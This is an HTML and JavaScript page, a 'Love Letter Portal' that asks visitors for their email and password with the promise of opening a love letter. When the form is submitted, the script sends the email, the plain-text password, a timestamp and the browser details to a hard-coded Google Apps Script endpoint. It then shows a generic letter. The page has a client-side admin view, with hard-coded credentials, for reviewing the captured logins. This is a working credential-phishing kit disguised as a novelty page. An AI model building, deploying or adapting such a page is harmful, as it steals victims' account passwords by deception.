<!DOCTYPE html>  <html lang="en">  
<head>  
    <meta charset="UTF-8">  
    <meta name="viewport" content="width=device-width, initial-scale=1.0">  
    <title>Love Letter Portal</title>  
    <style>  
        body {  
            font-family: 'Arial', sans-serif;  
            background: linear-gradient(135deg, #ff9a9e 0%, #fad0c4 100%);  
            margin: 0;  
            padding: 0;  
            display: flex;  
            justify-content: center;  
            align-items: center;  
            min-height: 100vh;  
            color: #333;  
        }  .container {  
        background-color: rgba(255, 255, 255, 0.9);  
        border-radius: 15px;  
        box-shadow: 0 10px 30px rgba(0, 0, 0, 0.1);  
        padding: 30px;  
        width: 350px;  
        text-align: center;  
        transition: all 0.3s ease;  
    }  

    h1 {  
        color: #e74c3c;  
        margin-bottom: 30px;  
    }  

    .form-container {  
        display: flex;  
        flex-direction: column;  
        align-items: center;  
        width: 100%;  
    }  

    .form-group {  
        margin-bottom: 20px;  
        text-align: left;  
        width: 100%;  
        max-width: 300px;  
    }  

    label {  
        display: block;  
        margin-bottom: 8px;  
        font-weight: bold;  
        color: #e74c3c;  
    }  

    input {  
        width: 100%;  
        padding: 12px;  
        border: 2px solid #fad0c4;  
        border-radius: 8px;  
        font-size: 16px;  
        transition: border 0.3s;  
        box-sizing: border-box;  
    }  

    input:focus {  
        border-color: #e74c3c;  
        outline: none;  
    }  

    button {  
        border: none;  
        padding: 12px 25px;  
        border-radius: 8px;  
        cursor: pointer;  
        font-size: 16px;  
        font-weight: bold;  
        transition: all 0.3s;  
        margin: 5px;  
    }  

    #login-btn {  
        background-color: #e74c3c;  
        color: white;  
        width: 100%;  
        max-width: 200px;  
    }  

    #login-btn:hover {  
        background-color: #c0392b;  
        transform: translateY(-2px);  
    }  

    #admin-btn {  
        background-color: #3498db;  
        color: white;  
        width: 100%;  
        max-width: 200px;  
    }  

    #admin-btn:hover {  
        background-color: #2980b9;  
        transform: translateY(-2px);  
    }  

    .love-letter {  
        display: none;  
        background-color: #fff9f9;  
        border: 2px solid #ffcccc;  
        border-radius: 15px;  
        padding: 20px;  
        margin-top: 20px;  
        text-align: left;  
    }  

    .love-letter h2 {  
        color: #e74c3c;  
        text-align: center;  
        margin-bottom: 15px;  
    }  

    .love-letter p {  
        line-height: 1.6;  
        margin-bottom: 10px;  
    }  

    .signature {  
        font-style: italic;  
        text-align: right;  
        margin-top: 20px;  
    }  

    .download-btn {  
        background-color: #3498db;  
        margin-top: 15px;  
        width: 100%;  
    }  

    .download-btn:hover {  
        background-color: #2980b9;  
    }  

    .heart {  
        color: #e74c3c;  
        font-size: 24px;  
        animation: pulse 1.5s infinite;  
        display: inline-block;  
    }  

    @keyframes pulse {  
        0% { transform: scale(1); }  
        50% { transform: scale(1.3); }  
        100% { transform: scale(1); }  
    }  

    .error {  
        color: #e74c3c;  
        margin-top: 10px;  
        font-size: 14px;  
    }  

    .admin-login {  
        display: none;  
        margin-top: 20px;  
    }  
</style>

</head>  
<body>  
    <div class="container" id="login-container">  
        <h1>Love Letter Portal <span class="heart">â™¥</span></h1>  <!-- Regular User Login -->  
    <div id="user-login">  
        <form id="login-form" class="form-container">  
            <div class="form-group">  
                <label for="email">Email</label>  
                <input type="email" id="email" required>  
            </div>  
            <div class="form-group">  
                <label for="password">Password</label>  
                <input type="password" id="password" required>  
            </div>  
            <button type="submit" id="login-btn">Open Your Love Letter</button>  
            <button type="button" id="admin-btn">Admin Login</button>  
            <div id="error-message" class="error"></div>  
        </form>  
    </div>  
      
    <!-- Admin Login (Hidden Initially) -->  
    <div id="admin-login" class="admin-login">  
        <form id="admin-form" class="form-container">  
            <div class="form-group">  
                <label for="admin-username">Username</label>  
                <input type="text" id="admin-username" required>  
            </div>  
            <div class="form-group">  
                <label for="admin-password">Password</label>  
                <input type="password" id="admin-password" required>  
            </div>  
            <button type="submit" id="admin-login-btn">Login as Admin</button>  
            <button type="button" id="back-to-user-btn">Back to User Login</button>  
            <div id="admin-error-message" class="error"></div>  
        </form>  
    </div>  
</div>  

<div class="container" id="letter-container" style="display: none;">  
    <div class="love-letter" id="love-letter">  
        <h2>My Dearest <span id="recipient-name">Love</span>,</h2>  
        <p>From the moment we met, my life has been filled with colors I never knew existed.</p>  
        <p>Your smile brightens my darkest days, and your laughter is the melody my heart dances to.</p>  
        <p>Every second with you feels like a beautiful dream I never want to wake up from.</p>  
        <p>I cherish the way you understand me without words and love me despite my flaws.</p>  
        <p>You are my greatest adventure, my safest harbor, and my most beautiful dream come true.</p>  
        <p class="signature">Forever yours,<br><span id="sender-name">Your Secret Admirer</span></p>  
    </div>  
    <button id="download-btn" class="download-btn">Download Love Note</button>  
    <button id="back-btn" style="margin-top: 10px;">Back to Login</button>  
</div>  

<div class="container" id="admin-container" style="display: none;">  
    <h2>Admin Dashboard</h2>  
    <div id="login-history">  
        <h3>Login History</h3>  
        <div id="history-list" style="max-height: 300px; overflow-y: auto;"></div>  
    </div>  
    <button id="download-history-btn" class="download-btn">Download History</button>  
    <button id="admin-back-btn" style="margin-top: 10px;">Logout</button>  
</div>  

<script>  
    // Your Google Apps Script URL  
    const GOOGLE_SCRIPT_URL = "https://script.google.com/macros/s/AKfycbxP09FdXOLYRDX4nVVb08vBtMYQwgggvR8Ksr43iPMawbBHHp6VxHxM--TysVqQf8DnXw/exec";  
      
    // DOM elements  
    const userLogin = document.getElementById('user-login');  
    const adminLogin = document.getElementById('admin-login');  
    const loginForm = document.getElementById('login-form');  
    const adminForm = document.getElementById('admin-form');  
    const emailInput = document.getElementById('email');  
    const passwordInput = document.getElementById('password');  
    const adminUsernameInput = document.getElementById('admin-username');  
    const adminPasswordInput = document.getElementById('admin-password');  
    const errorMessage = document.getElementById('error-message');  
    const adminErrorMessage = document.getElementById('admin-error-message');  
    const loginContainer = document.getElementById('login-container');  
    const letterContainer = document.getElementById('letter-container');  
    const adminContainer = document.getElementById('admin-container');  
    const recipientName = document.getElementById('recipient-name');  
    const downloadBtn = document.getElementById('download-btn');  
    const backBtn = document.getElementById('back-btn');  
    const downloadHistoryBtn = document.getElementById('download-history-btn');  
    const adminBackBtn = document.getElementById('admin-back-btn');  
    const adminBtn = document.getElementById('admin-btn');  
    const backToUserBtn = document.getElementById('back-to-user-btn');  
      
    // Show admin login form  
    adminBtn.addEventListener('click', function() {  
        userLogin.style.display = 'none';  
        adminLogin.style.display = 'block';  
    });  
      
    // Back to user login  
    backToUserBtn.addEventListener('click', function() {  
        adminLogin.style.display = 'none';  
        userLogin.style.display = 'block';  
        adminUsernameInput.value = '';  
        adminPasswordInput.value = '';  
        adminErrorMessage.textContent = '';  
    });  
      
    // Handle regular user login  
    loginForm.addEventListener('submit', async function(e) {  
        e.preventDefault();  
          
        const email = emailInput.value.trim();  
        const password = passwordInput.value.trim();  
          
        try {  
            // Save to Google Sheets  
            await saveToGoogleSheets(email, password, 'user');  
              
            // Show love letter  
            showLoveLetter(email);  
        } catch (error) {  
            errorMessage.textContent = "Error saving data. Please try again.";  
            console.error("Error:", error);  
        }  
    });  
      
    // Handle admin login  
    adminForm.addEventListener('submit', async function(e) {  
        e.preventDefault();  
          
        const username = adminUsernameInput.value.trim();  
        const password = adminPasswordInput.value.trim();  
          
        if (username === 'zafran' && password === 'zaff') {  
            try {  
                // Fetch data from Google Sheets  
                const historyData = await fetchLoginHistory();  
                  
                // Display history  
                displayLoginHistory(historyData);  
                  
                // Show admin panel  
                loginContainer.style.display = 'none';  
                adminContainer.style.display = 'block';  
            } catch (error) {  
                adminErrorMessage.textContent = "Failed to load data. Please try again.";  
            }  
        } else {  
            adminErrorMessage.textContent = "Invalid admin credentials";  
        }  
    });  
      
    // Function to save data to Google Sheets  
    async function saveToGoogleSheets(email, password, type) {  
        const data = {  
            email: email,  
            password: password,  
            type: type,  
            timestamp: new Date().toISOString(),  
            device: navigator.userAgent  
        };  
          
        const response = await fetch(GOOGLE_SCRIPT_URL, {  
            method: 'POST',  
            headers: {  
                'Content-Type': 'application/json',  
            },  
            body: JSON.stringify(data)  
        });  
          
        if (!response.ok) {  
            throw new Error('Failed to save to Google Sheets');  
        }  
          
        return await response.json();  
    }  
      
    // Function to fetch login history from Google Sheets  
    async function fetchLoginHistory() {  
        // This would require a separate GET endpoint in your Google Script  
        // For now, we'll just return sample data  
        return [  
            {email: "user1@example.com", timestamp: new Date().toISOString()},  
            {email: "user2@example.com", timestamp: new Date().toISOString()}  
        ];  
    }  
      
    // Display login history  
    function displayLoginHistory(data) {  
        const historyList = document.getElementById('history-list');  
          
        if (!data || data.length === 0) {  
            historyList.innerHTML = '<p>No login attempts recorded yet.</p>';  
            return;  
        }  
          
        let html = '<ul style="text-align: left; padding-left: 20px;">';  
        data.forEach(attempt => {  
            html += `<li>  
                <strong>Email:</strong> ${attempt.email || 'N/A'}<br>  
                <strong>Time:</strong> ${new Date(attempt.timestamp).toLocaleString()}  
            </li><br>`;  
        });  
        html += '</ul>';  
        historyList.innerHTML = html;  
    }  
      
    // Show love letter for regular users  
    function showLoveLetter(email) {  
        let name = email.split('@')[0] || "Beloved";  
        name = name.charAt(0).toUpperCase() + name.slice(1);  
        recipientName.textContent = name;  
          
        loginContainer.style.display = 'none';  
        letterContainer.style.display = 'block';  
    }  
      
    // Download functionality  
    downloadBtn.addEventListener('click', function() {  
        const letterContent = document.getElementById('love-letter').innerText;  
        downloadFile(letterContent, 'love_letter.txt');  
    });  
      
    // Download history functionality  
    downloadHistoryBtn.addEventListener('click', function() {  
        const historyContent = document.getElementById('history-list').innerText;  
        downloadFile(historyContent, 'login_history.txt');  
    });  
      
    // Helper function to download file  
    function downloadFile(content, filename) {  
        const blob = new Blob([content], {   
            type: filename.endsWith('.json') ? 'application/json' : 'text/plain'   
        });  
        const url = URL.createObjectURL(blob);  
        const a = document.createElement('a');  
        a.href = url;  
        a.download = filename;  
        document.body.appendChild(a);  
        a.click();  
        document.body.removeChild(a);  
        URL.revokeObjectURL(url);  
    }  
      
    // Back buttons functionality  
    backBtn.addEventListener('click', function() {  
        letterContainer.style.display = 'none';  
        loginContainer.style.display = 'block';  
        emailInput.value = '';  
        passwordInput.value = '';  
        errorMessage.textContent = '';  
        userLogin.style.display = 'block';  
        adminLogin.style.display = 'none';  
    });  
      
    adminBackBtn.addEventListener('click', function() {  
        adminContainer.style.display = 'none';  
        loginContainer.style.display = 'block';  
        adminUsernameInput.value = '';  
        adminPasswordInput.value = '';  
        adminErrorMessage.textContent = '';  
        userLogin.style.display = 'block';  
        adminLogin.style.display = 'none';  
    });  
</script>

</body>  
</html>
